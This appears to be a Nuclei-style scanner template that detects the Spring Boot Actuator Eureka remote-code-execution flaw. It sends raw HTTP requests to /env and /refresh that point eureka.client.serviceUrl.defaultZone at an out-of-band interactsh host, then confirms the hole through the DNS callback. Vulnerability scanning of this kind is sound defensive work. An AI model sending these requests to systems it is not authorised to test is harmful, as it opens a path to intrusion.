id: springboot_eureka_rce
info:
  author: yueji0j1anke
  classification:
    cve-id: ''
    cvss-metrics: ''
    cvss-score: 0.0
    cwe-id: ''
  description: ''
  name: springboot eureka rce
  reference: []
  severity: high
  tags: ''
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: and
  raw:
  - 'POST /env HTTP/1.1

    Content-Type: application/x-www-form-urlencoded


    eureka.client.serviceUrl.defaultZone=http://{{interactsh-url}}

    '
  - "POST /refresh HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\naaa\n\
    \  \n"
